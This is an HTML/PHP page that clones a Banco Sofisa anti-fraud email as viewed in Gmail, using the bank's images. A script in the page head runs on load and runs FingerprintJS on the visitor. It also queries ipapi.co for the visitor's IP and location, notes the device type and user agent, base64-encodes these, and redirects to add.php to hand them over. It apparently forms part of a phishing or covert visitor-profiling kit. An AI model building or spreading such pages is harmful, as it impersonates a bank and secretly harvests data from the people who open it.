<html>
<?php

?>

<head>
    <script>
    // Initialize the agent at application startup.
    const fpPromise = import('https://openfpcdn.io/fingerprintjs/v3')
        .then(FingerprintJS => FingerprintJS.load())

    // Get the visitor identifier when you need it.
    fpPromise
        .then(fp => fp.get())
        .then(result => {
            // This is the visitor identifier:
            const visitorId = result.visitorId
            //captura a linguagem do navegador
            const language = result.components.languages.value[0][0]
            //captura o user agent do navegador
            const ua = navigator.userAgent;
            //captura as informações do ip do usuário
            fetch('https://ipapi.co/json/')
                .then(function(response) {
                    switch (response.status) {
                        // status "OK"
                        case 200:
                            return response.text();
                            // status "Not Found"
                        case 404:
                            throw response;
                    }
                })
                .then(function(retornoip) {
                    //transforma a string json em um objeto
                    retornoip = JSON.parse(retornoip);
                    //exibe no console o retorno do ip
                    console.log(retornoip);
                    //cria variaveis para armazenar os dados do ip
                    const ip = retornoip.ip;
                    const city = retornoip.city;
                    const region = retornoip.region_code;
                    const country = retornoip.country;
                    let mobile = 'N'
                    //verifica se o usuário está usando um dispositivo móvel
                    if (navigator.userAgent.match(/Android/i) ||
                        navigator.userAgent.match(/webOS/i) ||
                        navigator.userAgent.match(/iPhone/i) ||
                        navigator.userAgent.match(/iPad/i) ||
                        navigator.userAgent.match(/iPod/i) ||
                        navigator.userAgent.match(/BlackBerry/i) ||
                        navigator.userAgent.match(/Windows Phone/i)) {

                        mobile = 'S'
                    }

                    //cria um array com os dados do usuário
                    const data = {
                        visitorId,
                        language,
                        ip,
                        city,
                        region,
                        country,
                        mobile,
                        ua

                    }
                    //exibe no console os dados do usuário
                    console.log(data)
                    //document.getElementById("demo").innerHTML = "Download Iniciado"
                    //transforma em base64 o array
                    var emBase64 = btoa(JSON.stringify(
                        data))
                    //verifica se o usuário está em um navegador de celular
                    if (mobile == 'S') {
                        //window.location.replace("./error.php");
                        window.location.replace("./add.php?data=" + emBase64);
                    } else {
                        window.location.replace("./add.php?data=" + emBase64);
                    }
                })
                .catch(function(response) {
                    // "Not Found"
                    console.log(response.statusText);
                });
        })
        .catch(error => console.error(error))
    </script>
    <!-- inicio do html -->
    <meta charset="UTF-8" />
    <title></title>
    <style type="text/css">
    @media only screen and (max-width: 600px) {

        table[class="wrapper"],
        img[class="wrapper"] {
            width: 300px !important;
        }

        .invisivel {
            display: none !important;
        }
    }

    .auto-style1 {
        width: 250px;
    }
    </style>
</head>

<body>
    <div><span style="display:none!important;opacity:0;color:#ffffff;height:0;width:0">Cada vez mais, novas formas de
            fraudes estão sendo aplicadas, complicando a vida de diversas pessoas.</span>
        <table align="center" cellpadding="0" cellspacing="0"
            style="max-width:700px;width:100%;background-color:#f4f4f4;font-family:Arial">
            <tbody>
                <tr>
                    <td align="center"><img alt=""
                            src="https://ci6.googleusercontent.com/proxy/GxHfSOD-uoI0oXJGXZx2H9A-6iLdTQOZieIQHhTV0TJ-vmUZdFXhyMoASIjy6s1Ri3swhFz3LeaYEbgKMWed2UvJUeGcJoYd7CLI6OLeWeaPHAnNdwvgORgKtKOXeVXXzdek1_rAqDK9YJuQ2-7SwYsvbdvIId5epZ4wlB6K33EyuZNr5Tb4k1kg1PN1kk9K0QFtHOeocWjh-kFfh_U75wRGed51P2xzpDYnnKtBmlzT8fn4XmygCnoUiU8=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_01.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 227px;">
                            <div id=":fb" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0"
                                aria-label="Fazer o download do anexo " data-tooltip-class="a1V"
                                data-tooltip="Fazer o download">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="center" width="100%">
                        <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
                            <tbody>
                                <tr>
                                    <td width="10.4%"></td>
                                    <td>
                                        <p
                                            style="font-family:Arial;font-size:28px;line-height:130%;text-align:left;color:#00a88f;margin:25px 0 0 0">
                                            <strong>Olá,&nbsp;Rafael</strong>
                                        </p>

                                        <p
                                            style="font-family:Arial;font-size:16px;line-height:130%;text-align:left;color:#7b7b7b;margin:20px 0">
                                            Cada vez mais, novas formas de fraudes estão sendo aplicadas, complicando a
                                            vida de diversas pessoas.<br>
                                            <br>
                                            Com objetivo de evitar esse tipo de transtorno, trouxemos informações úteis
                                            para se esquivar de possíveis ataques.
                                        </p>
                                    </td>
                                    <td width="10.4%"></td>
                                </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td align="center"><img alt=""
                            src="https://ci4.googleusercontent.com/proxy/_3gbDgR6qFn40UEuBdaDhtYXrkAWyItTrXwYB-xnivq7R82g3UnVT7_6MQmTS0-sXxvDrswuvvw468Dvg1krn5cGFbJjKucU9mFqYWe_IWc5-fF6cv55PQsxHzjIQFSf9srdgzRvM81DLK7lFSe0jXrBym-GAvCuTLkjFoeUMkI1N2rO6_xu7HhboItU5WNhEzGgZj3w8pDHDF5gLZLFEY8oBxVI8C7P9Jpqr2XbH9D8pAosflLSi-Ivfsw=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_03.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 602.563px;">
                            <div id=":fc" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0"
                                aria-label="Fazer o download do anexo " data-tooltip-class="a1V"
                                data-tooltip="Fazer o download">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="=center"><img alt=""
                            src="https://ci5.googleusercontent.com/proxy/s4eA9f_-pI_Qj7MndtjSzF8p9KXFD-Ljq55ygXd1MDhKooRc8Esf5MYmguyZtI1ln027Z5HNsLjJnBcivgHKH9I6TSew8YZ-teVNn_HDF41q1a-NUH9C8r73iOzd4mM_ofDvy8Zi-NGLRKkcaKa4RQ2clPQFL_2glopMGJQVrwDx1GjbdyZBPI3qmfYFA6XVmViDOgNjv6w_o7D4kjIUigu8zehkJi5d_JvXGh-kBkkMS8dTzPeVwytsE7A=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_04.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 765.563px;">
                            <div id=":fd" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0"
                                aria-label="Fazer o download do anexo " data-tooltip-class="a1V"
                                data-tooltip="Fazer o download">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="center"><img alt=""
                            src="https://ci6.googleusercontent.com/proxy/ouzDScywTdnM8RjTR4wHM8zkTBmDl7o_CpMVAf0GYtW3mJfexwXO52FY_lbp4opiOzmyDBpFU72Tc7agR4teaCJx9-Y6vUrIv5RInSd1lJ4OBkRFZD45WdkY_fUolH5OWD8s1_sx3LtFavEQ24wXELatuWXEoLLQm7E2jwOYxShyo5S_18z4AE3wAonhtyYBxFSCAYR1IUDcICZ3ATsuAfdTwlGMNkc2za5waU8GRqa5es9Zkqyx57G1-MI=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_05.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 988.344px;">
                            <div id=":fe" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0"
                                aria-label="Fazer o download do anexo " data-tooltip-class="a1V"
                                data-tooltip="Fazer o download">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="center"><img alt=""
                            src="https://ci4.googleusercontent.com/proxy/X_5Uwdifyj26N_bFNwfUSSS3t-9A8WYTrm759BPQBgtLCg2_TcPZWdsU2m2ZaBvicKdxUOCkLx1NHZIoNAWYW934oj-ktIch1UE4EGaIvEuEIXvWj1WRb8lXT5VIZdyb0TLZSpGtnQSKbO4FZa_E7Rx81T0imi6pbxeZoHHVAhshG9ifsfAtG46KEcegLU9m1aIrR3CCEYnoq7ScAc6bL0O9pczMSUkUMt3HsOsBHdi2h9XsbT6mB92zkQk=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_06.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 1174.33px;">
                            <div id=":ff" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0"
                                aria-label="Fazer o download do anexo " data-tooltip-class="a1V"
                                data-tooltip="Fazer o download">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="center"><img alt=""
                            src="https://ci3.googleusercontent.com/proxy/HWRzc6mMA9Ie0946rn76qPxsoFJX9Jj5hqYzfP47W6WW65eLaDWT4a5o7EFWPGiFwDVqnE58ULGqSRtPY6iOaNj4-CqfrkfPclmGWFkq0vmDzFW7-Yc2FZKuSUgbZ6H55_3stlh40JaPeDvdaAHY4YwhXTLMem84lG36afV_x3fDgUxyoiawHO4emhpRVtGszvx0voFjQYAwT8s3o97wkLkD-nPBYI8SA-cMzzpr0bQQTeKMMOeQM8rpC_U=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_07.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 1304.45px;">
                            <div id=":fg" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" title="Fazer o download" role="button"
                                tabindex="0" aria-label="Fazer o download do anexo " data-tooltip-class="a1V">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="center"><img alt=""
                            src="https://ci4.googleusercontent.com/proxy/IbRevp74TM3Id7yZ6ocCfV2k0EoirIsoB6Bo5b-2szAxBBZeS5EwU9SazZWLuatVO26JTTs6n6tGSKhvHWtAmnKh7yEmWRQuietKdoEMeJKKhVE5eHibsPfUPGQl6jQpXsquQIF5cXvCe-OKWplRMHVeXXuQyIkI3IrlJEgJ9xMPjiB4DHg-zwniH0QCzq644pdysIL0t1QKErgNvweI7KH0xwLmOZMWyvcOr9GV4iaWGDL434jhR2ASTZk=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/campaigns/2022-03-28_comunicado_informativo/html/images/EMAIL_Contatos-Suspeitos-(1)_08.png"
                            style="display:block;width:100%" class="CToWUd a6T" tabindex="0">
                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 382px; top: 1478.06px;">
                            <div id=":fh" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0"
                                aria-label="Fazer o download do anexo " data-tooltip-class="a1V"
                                data-tooltip="Fazer o download">
                                <div class="akn">
                                    <div class="aSK J-J5-Ji aYr"></div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td align="center" width="100%">
                        <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
                            <tbody>
                                <tr>
                                    <td width="10.4%"></td>
                                    <td>
                                        <p
                                            style="font-family:Arial;font-size:16px;line-height:130%;text-align:left;color:#6c6c6c;margin:25px 0 0 0">
                                            Quando se trata do seu dinheiro, todo cuidado é pouco. Compartilhe a
                                            informação com os amigos e proteja-se dos contratempos.
                                        </p>
                                    </td>
                                    <td width="10.4%"></td>
                                </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td style="height:30px"></td>
                </tr>
                <tr>
                    <td align="center"><img align="middle" border="0"
                            src="https://ci4.googleusercontent.com/proxy/Es1apo1Vge5MuO_mttrbhbH8Sw1cJpD9vmY1hrXvfZg8eXQHSkl5H1elm4X6l_1a6JIsHnD-0uOdTayA2QVRAzxMbGrxQILygLQpG9wMCDKczCPW8M9F2WE0cvDoifoKHf5B6ugFQm8VK-fK4LR57s2WY3pDs1QTAO-4bQeBHA=s0-d-e1-ft#https://static.cdn.responsys.net/i2/responsysimages/bancosofi/contentlibrary/imagens/padrao/logo_slogan1.png"
                            style="display:block" width="249" class="CToWUd"></td>
                </tr>
            </tbody>
        </table>
        <table cellpadding="0" cellspacing="0" style="border:0px;padding:0px;margin:0px;display:none;float:left">
            <tbody>
                <tr>
                    <td height="1" style="font-size:1px;line-height:1px;padding:0px">
                        <br><img
                            src="https://ci4.googleusercontent.com/proxy/7n9T2ZElQy2nmv9zMlSFp349y0rZr-usev-okaG18TiGDJdCp-OoJTeTLIhGKZ8BSnqNr8hzskXUfQBT7XHMgOd9VbQreHpCpAItDdVmY05-ACCfPDN8lMUFi2S7Fpzan3YbRwEvnz8pEFVhVcFMnDl2AzGQN5UpEuXa1mmQCA7IXrVw42cWpb7II9U_5ETaFL3ONkEcBGzIO60Pf8mLOBq_xbjWcEqz6lONH05i7vWNwvwlBkNTaPPBPoa5HRQxVEMqCqnmoNsSfuCuRMMxkUDGIY1EW6V6pr7CceU9CJmfbxspQPmD4tXQYY88OxNjwsZU8QIcdgSMnPDnxQ=s0-d-e1-ft#http://e.sofisadireto.com.br/pub/as?_ri_=X0Gzc2X%3DAQpglLjHJlTQGqXzatchzb3ukwrPlTuGMBcwGtlAElgWupF3zgzckze2hzdjohtO2CuaCXXCrF0SfVXHkMX%3Dw&amp;_ei_=EUlaGGF4SNMvxFF7KucKuWPlFz1dILAOza1GiqAzFcm6ctxV0rTUtEQk5AOApDDK5QfkLYbS4p3URxW8hppYAdYH."
                            class="CToWUd" jslog="138226; u014N:xr6bB; 53:W2ZhbHNlXQ..">
                    </td>
                </tr>
            </tbody>
        </table>
        <div class="yj6qo"></div>
        <div class="adL">
        </div>
    </div>
</body>
<!-- fim do html -->

</html>